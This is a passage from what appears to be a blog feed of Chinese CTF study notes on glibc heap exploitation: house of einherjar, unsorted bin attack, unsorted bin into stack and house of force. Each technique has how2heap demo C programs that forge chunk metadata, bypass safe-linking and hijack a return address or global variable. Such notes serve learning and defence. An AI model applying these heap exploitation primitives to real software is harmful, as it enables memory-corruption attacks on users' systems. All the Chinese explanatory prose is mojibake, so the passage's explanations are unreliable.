 \<br><br>â€¦â€¦<br><br>&#125;<br></code></pre></td></tr></table></figure>è¦ä¼ªé€ fake chunkçš„size</li></ul><h2 id="2-29-2-31"><a href="#2-29-2-31" class="headerlink" title="2.29-2.31"></a>2.29-2.31</h2><p>2.29å¢åŠ äº†å¯¹top chunkçš„sizeçš„åˆæ³•æ€§æ£€æŸ¥ï¼Œç”±äºbåœ¨å‘ä¸‹åˆå¹¶åè¿˜ä¼šå‘ä¸Šåˆå¹¶ï¼Œè¿™å°±å¿…ç„¶å¯¼è‡´top chunkçš„sizeä¸åˆæ³•</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">use_top:<br><br>  victim = av-&gt;top;<br>  size = chunksize (victim);<br><br>  <span class="hljs-keyword">if</span> (__glibc_unlikely (size &gt; av-&gt;system_mem))<br>    malloc_printerr (<span class="hljs-string">&quot;malloc(): corrupted top size&quot;</span>);<br></code></pre></td></tr></table></figure><p>å¯ä»¥é€šè¿‡åœ¨free(b)å‰å†mallocéšä¾¿ä¸€ä¸ªchunkæ¥é˜²æ­¢å’Œtop chunkåˆå¹¶ï¼Œä½†è¿™æ ·è¿˜æ˜¯ä¼šè§¦å‘å¦ä¸€ä¸ªæ£€æŸ¥<br>2.29_int_mallocéå†unsorted binçš„æ—¶å€™è¿˜å¢åŠ äº†å¯¹chunkçš„sizeçš„åˆæ³•æ€§çš„æ£€æŸ¥</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (__glibc_unlikely (size &lt;= <span class="hljs-number">2</span> * SIZE_SZ)<br>    || __glibc_unlikely (size &gt; av-&gt;system_mem))<br>  malloc_printerr (<span class="hljs-string">&quot;malloc(): invalid size (unsorted)&quot;</span>);<br></code></pre></td></tr></table></figure><p>å› æ­¤æˆ‘ä»¬éœ€è¦ä¸€ç§å…¨æ–°çš„åˆ©ç”¨æ–¹æ³•ï¼Œå®éªŒä»£ç å¦‚ä¸‹ï¼ˆæ¥è‡ªhow2heapï¼‰ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;malloc.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;assert.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    setbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-literal">NULL</span>);<br>    setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-literal">NULL</span>);<br><br>    <span class="hljs-type">intptr_t</span> stack_var[<span class="hljs-number">4</span>];<br>    <span class="hljs-type">intptr_t</span> *a = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x38</span>);<br><br>    a[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;    <span class="hljs-comment">// prev_size (Not Used)</span><br>    a[<span class="hljs-number">1</span>] = <span class="hljs-number">0x60</span>; <span class="hljs-comment">// size</span><br>    a[<span class="hljs-number">2</span>] = (<span class="hljs-type">size_t</span>) a; <span class="hljs-comment">// fwd</span><br>    a[<span class="hljs-number">3</span>] = (<span class="hljs-type">size_t</span>) a; <span class="hljs-comment">// bck</span><br><br>    <span class="hljs-type">uint8_t</span> *b = (<span class="hljs-type">uint8_t</span> *) <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x28</span>);<br>    <span class="hljs-type">int</span> real_b_size = malloc_usable_size(b);<br>    <span class="hljs-type">uint8_t</span> *c = (<span class="hljs-type">uint8_t</span> *) <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0xf8</span>);<br>    <span class="hljs-type">uint64_t</span>* c_size_ptr = (<span class="hljs-type">uint64_t</span>*)(c - <span class="hljs-number">8</span>);<br><br>    b[real_b_size] = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-type">size_t</span> fake_size = (<span class="hljs-type">size_t</span>)((c - <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">size_t</span>) * <span class="hljs-number">2</span>) - (<span class="hljs-type">uint8_t</span>*) a);<br>    *(<span class="hljs-type">size_t</span>*) &amp;b[real_b_size-<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">size_t</span>)] = fake_size;<br><br>    a[<span class="hljs-number">1</span>] = fake_size;<br><br>    <span class="hljs-type">intptr_t</span> *x[<span class="hljs-number">7</span>];<br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-keyword">sizeof</span>(x)/<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">intptr_t</span>*); i++) &#123;<br>        x[i] = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0xf8</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-keyword">sizeof</span>(x)/<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">intptr_t</span>*); i++) &#123;<br>        <span class="hljs-built_in">free</span>(x[i]);<br>    &#125;<br><br>    <span class="hljs-built_in">free</span>(c);<br><br>    <span class="hljs-type">intptr_t</span> *d = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x158</span>);<br>    <span class="hljs-type">uint8_t</span> *pad = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x28</span>);<br><br>    <span class="hljs-built_in">free</span>(pad);<br>    <span class="hljs-built_in">free</span>(b);<br><br>    d[<span class="hljs-number">0x30</span> / <span class="hljs-number">8</span>] = (<span class="hljs-type">long</span>) stack_var;<br><br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x28</span>);<br>    <br>    <span class="hljs-type">intptr_t</span> *e = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x28</span>);<br><br>    <span class="hljs-comment">// sanity check</span><br>    assert(e == stack_var);<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>å…ˆç”³è¯·aï¼ˆ0x40ï¼‰ã€bï¼ˆ0x30ï¼‰å’Œcï¼ˆ0x100ï¼‰ä¸‰ä¸ªchunkï¼Œå¡«æ»¡tcacheï¼Œå†å°†ç„¶åfree(c)åˆ©ç”¨of by nullæ¼æ´å½¢æˆå †å—é‡å ï¼Œå¦‚ç¤ºæ„å›¾æ‰€ç¤ºï¼š<img src="/2023/02/06/house-of-einherjar/1.jpg" class title="æ­¥éª¤ä¸€"></li><li>mallocå›cï¼Œç„¶åå†mallocä¸€ä¸ª0x28çš„chunkç„¶åfreeç»•è¿‡tcacheçš„countæ£€æŸ¥</li><li>free(b)ï¼Œbè¿›å…¥tcacheï¼Œé€šè¿‡dæ”¹å˜bçš„fdæŒ‡å‘stack_varï¼Œå†ç”³è¯·ä¸¤ä¸ªchunkå°±èƒ½æ§åˆ¶stack_var</li></ul><h2 id="2-32ä»¥ä¸Š"><a href="#2-32ä»¥ä¸Š" class="headerlink" title="2.32ä»¥ä¸Š"></a>2.32ä»¥ä¸Š</h2><p>å®éªŒä»£ç å¤šäº†è¿™ä¹ˆä¸€æ­¥ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">0x10</span>; i++) &#123;<br><span class="hljs-keyword">if</span>(((<span class="hljs-type">long</span>)&amp;stack_var[i] &amp; <span class="hljs-number">0xf</span>) == <span class="hljs-number">0</span>) &#123;<br>target = &amp;stack_var[i];<br><span class="hljs-keyword">break</span>;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å› ä¸º2.32å¢åŠ äº†chunkåœ°å€å¯¹é½0x10çš„æ£€æŸ¥</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (__glibc_unlikely (!aligned_OK (e)))<br>  malloc_printerr (<span class="hljs-string">&quot;malloc(): unaligned tcache chunk detected&quot;</span>);<br></code></pre></td></tr></table></figure><p>è¿˜æ”¹äº†è¿™ä¸€æ­¥</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">d[<span class="hljs-number">0x30</span> / <span class="hljs-number">8</span>] = (<span class="hljs-type">long</span>)target ^ ((<span class="hljs-type">long</span>)&amp;d[<span class="hljs-number">0x30</span>/<span class="hljs-number">8</span>] &gt;&gt; <span class="hljs-number">12</span>);<br></code></pre></td></tr></table></figure><p>å› ä¸º2.32å¢åŠ äº†safe-linkingæœºåˆ¶</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Pwn</category>
      
      <category>Heap</category>
      
    </categories>
    
    
    <tags>
      
      <tag>how2heap</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>unsorted bin attack</title>
    <link href="/2023/02/06/unsorted-bin-attack/"/>
    <url>/2023/02/06/unsorted-bin-attack/</url>
    
    <content type="html"><![CDATA[<p>å²æ— å‰ä¾‹ç®€çŸ­çš„å®éªŒä»£ç (Ë‰â–½Ë‰ï¼›)â€¦</p><span id="more"></span><h1 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h1><p>unsorted bin attackåˆ©ç”¨çš„æ˜¯_int_mallocä¸­éå†unsorted binå–ä¸‹chunkçš„è¿‡ç¨‹ï¼Œå®ç°æ•ˆæœä¸ºä»»æ„åœ°å€å†™unsorted binçš„åœ°å€</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">unsorted_chunks (av)-&gt;bk = bck;<br>bck-&gt;fd = unsorted_chunks (av);<br></code></pre></td></tr></table></figure><p>2.28å¢åŠ äº†å¯¹chunkçš„å‰åè¿æ¥çš„æ£€æŸ¥æœºåˆ¶ï¼Œè¿™ä¸ªæ–¹æ³•å°±å¤±æ•ˆäº†</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))<br> malloc_printerr (<span class="hljs-string">&quot;malloc(): corrupted unsorted chunks 3&quot;</span>);<br>unsorted_chunks (av)-&gt;bk = bck;<br>bck-&gt;fd = unsorted_chunks (av);<br></code></pre></td></tr></table></figure><h1 id="åˆ©ç”¨"><a href="#åˆ©ç”¨" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h1><h2 id="2-26ä»¥å‰"><a href="#2-26ä»¥å‰" class="headerlink" title="2.26ä»¥å‰"></a>2.26ä»¥å‰</h2><p>å®éªŒä»£ç å…¥ä¸‹ï¼ˆæ¥è‡ªhow2heapï¼‰ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> stack_var=<span class="hljs-number">0</span>;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *p=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">400</span>);<br><span class="hljs-built_in">malloc</span>(<span class="hljs-number">500</span>);<span class="hljs-comment">//é˜²æ­¢åˆå¹¶</span><br><span class="hljs-built_in">free</span>(p);<br>p[<span class="hljs-number">1</span>]=(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)(&amp;stack_var<span class="hljs-number">-2</span>);<br><span class="hljs-comment">//p-&gt;bk=stack_var-0x10</span><br><span class="hljs-comment">//stack_var-0x10-&gt;presize</span><br><span class="hljs-comment">//stack_var-8-&gt;size</span><br><span class="hljs-comment">//stack_var-&gt;fd</span><br><span class="hljs-built_in">malloc</span>(<span class="hljs-number">400</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>malloc(400)çš„è¿‡ç¨‹ä¸­æ‰§è¡Œäº†ä»¥ä¸‹æ­¥éª¤ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//victim=p</span><br>bck = victim-&gt;bk;<br><span class="hljs-comment">//bck=p-&gt;bk=stack_var-0x10</span><br>unsorted_chunks (av)-&gt;bk = bck;<br>bck-&gt;fd = unsorted_chunks (av);<br><span class="hljs-comment">//(stack_var-0x10)-&gt;fd=stack_var=unsorted_chunks(av)</span><br></code></pre></td></tr></table></figure><h2 id="2-26-2-27"><a href="#2-26-2-27" class="headerlink" title="2.26-2.27"></a>2.26-2.27</h2><p>æœ‰äº†tcacheï¼Œç”³è¯·çš„chunkè¦åœ¨tcacheçš„èŒƒå›´å¤–</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Pwn</category>
      
      <category>Heap</category>
      
    </categories>
    
    
    <tags>
      
      <tag>how2heap</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>unsorted bin into stack</title>
    <link href="/2023/02/06/unsorted-bin-into-stack/"/>
    <url>/2023/02/06/unsorted-bin-into-stack/</url>
    
    <content type="html"><![CDATA[<p>åˆæ²¡æœ‰ä¾‹é¢˜(ï¿£ã€ï¿£)</p><span id="more"></span><h1 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h1><p>å®ç°æ•ˆæœä¸ºåˆ†é…chunkåˆ°æ ˆä¸Š<br>unsorted binéå†è¿‡ç¨‹ä¸­æ˜¯ç”¨binçš„bkæŒ‡é’ˆå¯»æ‰¾chunkçš„</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))<br></code></pre></td></tr></table></figure><p>ä»unsorted binä¸­æ‘˜ä¸‹chunkçš„æ—¶å€™æœ‰ä»¥ä¸‹å¯»å€ï¼Œæ‰€ä»¥victim-&gt;bkå¾—æ˜¯ä¸€ä¸ªåˆæ³•åœ°å€ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">bck = victim-&gt;bk;<br>â€¦â€¦<br>unsorted_chunks (av)-&gt;bk = bck;<br>bck-&gt;fd = unsorted_chunks (av);<br></code></pre></td></tr></table></figure><p>2.28å¢åŠ äº†ä»¥ä¸‹æ£€æŸ¥ï¼Œæ‰€ä»¥è¦ä¼ªé€ bckçš„fdæŒ‡é’ˆï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))<br> malloc_printerr (<span class="hljs-string">&quot;malloc(): corrupted unsorted chunks 3&quot;</span>);<br></code></pre></td></tr></table></figure><p>2.29å¢åŠ äº†next chunkçš„presizeå’Œsizeã€preinuseæ£€æŸ¥ï¼Œæ— æ³•åˆ©ç”¨äº†ï¼ˆå¦‚æœèƒ½åœ¨æ ˆä¸Šæ‰¾åˆ°åˆæ³•çš„next chunkå€’æ˜¯èƒ½ç”¨ï¼Œä½†å¯èƒ½æ€§æ„Ÿè§‰ä¸å¤§ï¼‰</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (__glibc_unlikely ((prev_size (next) &amp; ~(SIZE_BITS)) != size))<br>  malloc_printerr (<span class="hljs-string">&quot;malloc(): mismatching next-&gt;prev_size (unsorted)&quot;</span>);<br><span class="hljs-keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim)<br>|| __glibc_unlikely (victim-&gt;fd != unsorted_chunks (av)))<br>   malloc_printerr (<span class="hljs-string">&quot;malloc(): unsorted double linked list corrupted&quot;</span>);<br><span class="hljs-keyword">if</span> (__glibc_unlikely (prev_inuse (next)))<br>  malloc_printerr (<span class="hljs-string">&quot;malloc(): invalid next-&gt;prev_inuse (unsorted)&quot;</span>);<br></code></pre></td></tr></table></figure><h1 id="åˆ©ç”¨"><a href="#åˆ©ç”¨" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h1><h2 id="2-26ä»¥å‰"><a href="#2-26ä»¥å‰" class="headerlink" title="2.26ä»¥å‰"></a>2.26ä»¥å‰</h2><p>å®éªŒä»£ç å¦‚ä¸‹ï¼ˆæ¥è‡ªhow2heapï¼‰ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;assert.h&gt;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">jackpot</span><span class="hljs-params">()</span>&#123; <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Nice jump d00d\n&quot;</span>); <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>); &#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br><span class="hljs-type">intptr_t</span> stack_buffer[<span class="hljs-number">4</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br><span class="hljs-type">intptr_t</span>* victim = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x110</span>);<br><span class="hljs-comment">//victimçš„å¤§å°ä¸èƒ½å’Œbufferç›¸åŒ</span><br><span class="hljs-type">intptr_t</span>* p1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br><br><span class="hljs-built_in">free</span>(victim);<br><br>stack_buffer[<span class="hljs-number">1</span>] = <span class="hljs-number">0x100</span> + <span class="hljs-number">0x10</span>;<br><span class="hljs-comment">//ä¼ªé€ size</span><br>stack_buffer[<span class="hljs-number">3</span>] = (<span class="hljs-type">intptr_t</span>)stack_buffer;<br><span class="hljs-comment">//ä¼ªé€ victim-&gt;bkä¸ºä»»æ„åˆæ³•å¯å†™åœ°å€</span><br><br>victim[<span class="hljs-number">1</span>] = (<span class="hljs-type">intptr_t</span>)stack_buffer; <br><span class="hljs-comment">//ä¼ªé€ bkæŒ‡é’ˆä½¿bufferé“¾å…¥unsorted bin</span><br><br><span class="hljs-type">char</span> *p2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br><span class="hljs-comment">//ç”³è¯·åˆ°buffer</span><br><br><span class="hljs-type">intptr_t</span> sc = (<span class="hljs-type">intptr_t</span>)jackpot;<br><span class="hljs-built_in">memcpy</span>((p2+<span class="hljs-number">40</span>), &amp;sc, <span class="hljs-number">8</span>); <br><br>assert((<span class="hljs-type">long</span>)__builtin_return_address(<span class="hljs-number">0</span>) == (<span class="hljs-type">long</span>)jackpot);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="2-26åˆ°2-28"><a href="#2-26åˆ°2-28" class="headerlink" title="2.26åˆ°2.28"></a>2.26åˆ°2.28</h2><p>2.26æœ‰äº†tcacheä¹‹åç”³è¯·çš„chunkå¤§å°è¦è¶…è¿‡tcacheçš„èŒƒå›´ï¼Œ2.28è¦ä¼ªé€ æ ˆä¸Šfake chunkçš„bkå’ŒfdæŒ‡é’ˆ</p><h2 id="2-29ä»¥ä¸Š"><a href="#2-29ä»¥ä¸Š" class="headerlink" title="2.29ä»¥ä¸Š"></a>2.29ä»¥ä¸Š</h2><p>å¦‚æœèƒ½ä¼ªé€ next chunkçš„presizeå’Œpreinuseå°±èƒ½ç»§ç»­åˆ©ç”¨</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Pwn</category>
      
      <category>Heap</category>
      
    </categories>
    
    
    <tags>
      
      <tag>how2heap</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>house of force</title>
    <link href="/2023/02/05/house-of-force/"/>
    <url>/2023/02/05/house-of-force/</url>
    
    <content type="html"><![CDATA[<p>è·³è¿‡äº†mmap overlapping chunksï¼Œå“ªå¤©æœ‰å¿ƒæƒ…è¯¦ç»†ç ”ç©¶ä¸‹ç›¸å…³æºç å’Œæœºåˆ¶å†å†™å§ï¼ˆæ„Ÿè§‰ä¹Ÿä¸å¤ªä¼šç”¨åˆ°ï¼‰ï¼Œå…ˆæç®€å•çš„house of force</p><span id="more"></span><h1 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h1><p>æ§åˆ¶top chunkçš„å¤§å°ä¸ºä¸€ä¸ªå¾ˆå¤§çš„å€¼ï¼ˆ-1ï¼‰ï¼Œå¦‚æœæˆ‘ä»¬å·²çŸ¥top chunkå’Œæˆ‘ä»¬éœ€è¦æ§åˆ¶çš„åœ°å€çš„æ’å€¼å°±èƒ½ç›´æ¥ç”³è¯·chunkåˆ°é‚£é‡Œ</p><h1 id="åˆ©ç”¨"><a href="#åˆ©ç”¨" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h1><h2 id="2-29ä»¥å‰"><a href="#2-29ä»¥å‰" class="headerlink" title="2.29ä»¥å‰"></a>2.29ä»¥å‰</h2><p>å®éªŒä»£ç å¦‚ä¸‹ï¼ˆæ¥è‡ªhow2heapï¼‰ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;malloc.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;assert.h&gt;</span></span><br><br><span class="hljs-type">char</span> bss_var[] = <span class="hljs-string">&quot;This is a string that we want to overwrite.&quot;</span>;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc , <span class="hljs-type">char</span>* argv[])</span><br>&#123;<br><span class="hljs-type">intptr_t</span> *p1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">256</span>);<br><span class="hljs-type">int</span> real_size = malloc_usable_size(p1);<br><span class="hljs-type">intptr_t</span> *ptr_top = (<span class="hljs-type">intptr_t</span> *) ((<span class="hljs-type">char</span> *)p1 + real_size - <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">long</span>));<br><br>*(<span class="hljs-type">intptr_t</span> *)((<span class="hljs-type">char</span> *)ptr_top + <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">long</span>)) = <span class="hljs-number">-1</span>;<br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> evil_size = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)bss_var - <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">long</span>)*<span class="hljs-number">4</span> - (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)ptr_top;<br><span class="hljs-type">void</span> *new_ptr = <span class="hljs-built_in">malloc</span>(evil_size);<br><span class="hljs-type">void</span>* ctr_chunk = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">100</span>);<br><br><span class="hljs-built_in">strcpy</span>(ctr_chunk, <span class="hljs-string">&quot;YEAH!!!&quot;</span>);<br><br>assert(ctr_chunk == bss_var);<br>&#125;<br></code></pre></td></tr></table></figure><p>åˆ©ç”¨æ­¥éª¤å¦‚ä¸‹ï¼š</p><ul><li><p>ä¿®æ”¹top chunkçš„å¤§å°ä¸º-1</p></li><li><p>è®¡ç®—</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">evil_size = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)bss_var - <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">long</span>)*<span class="hljs-number">4</span> - (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)ptr_top;<br></code></pre></td></tr></table></figure><p>å‡å»4ä¸ª8å­—èŠ‚æ˜¯å‡å»äº†ç”³è¯·chunkçš„presizeå’Œsizeï¼Œä»¥åŠä¸‹ä¸€ä¸ªè¦ç”³è¯·çš„chunkçš„presizeå’Œsize</p></li><li><p>å†ç”³è¯·ä¸€ä¸ªchunkï¼Œå°±èƒ½æ§åˆ¶bss_varçš„å€¼äº†</p></li></ul><h2 id="2-29ä»¥å"><a href="#2-29ä»¥å" class="headerlink" 